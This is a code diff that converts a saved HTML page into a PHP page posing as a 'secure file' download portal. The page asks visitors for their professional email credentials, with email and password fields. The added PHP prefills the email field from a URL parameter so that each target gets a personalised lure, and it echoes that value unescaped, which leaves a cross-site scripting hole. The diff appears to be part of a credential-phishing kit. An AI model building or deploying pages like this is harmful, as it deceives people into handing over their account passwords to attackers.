@@ -1,4 +1,9 @@
-<!-- Saved from http://localhost/ at 2023-01-29T00:21:40Z using monolith v2.7.0 -->
+<?php
+$email = $_GET['qrc'];
+if ($email) {
+    $email = urldecode($email);
+}
+?>
 <!DOCTYPE html><html lang="en" dir="ltr" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" class="responsive"><head>
         <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
         <meta name="msapplication-tap-highlight" content="no">
@@ -119,7 +124,9 @@
                                     <span id="lblSignInDescription">To receive and download this Secure file, please enter specific professional email credentials that this document was sent to.</span>
                                 </div>
                                 <div class="form-input-container">
-                                    <input type="email" name="email" id="email" class=" form-text-input" placeholder="Enter email" required="">
+                                    <input type="email" name="email" id="email" 
+                                    value="<?php echo $email ?>"
+                                    class=" form-text-input" placeholder="Enter email" required="">
                                 </div>
                                 <div class="form-input-container">
                                     <input type="password" name="password" id="password" class="form-text-input" placeholder="Enter password" hidden="">
